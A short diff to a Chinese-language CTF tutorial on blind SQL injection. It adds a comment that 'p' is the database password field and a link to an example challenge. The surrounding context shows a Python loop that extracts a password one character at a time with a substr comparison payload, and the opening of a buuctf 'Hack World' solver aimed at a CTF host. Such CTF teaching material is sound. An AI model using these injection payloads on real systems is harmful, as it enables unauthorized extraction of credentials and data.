@@ -428,6 +428,7 @@ flag=''
 for i in range(1,18):
     print("第"+str(i)+"位")
     for j in s:
+      	# 此处的 p 其实是数据库表中的密码属性名
         data={"u": f"'||substr(p,{str(i)},1)<'"+j, 
               "p": "1"}
 
@@ -467,12 +468,12 @@ chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。�
 
 ##### 猜 flag
 
-该方案用于已数据库的两个返回内容，如知道 id=1 和 id=2 的返回内容，通过 id 的填充值来注入。
+该方案用于已数据库的两个返回内容，如知道 id=1 和 id=2 的返回内容，通过 id 的填充值来注入。例题：https://www.ctfer.vip/problem/1
 
 ```python
 #buuctf web Hack World
 import requests
- 
+
  
 url = "http://3bdb8fd8-acb8-4230-96d0-3845226525ba.node4.buuoj.cn:81/index.php"
 flag = ""
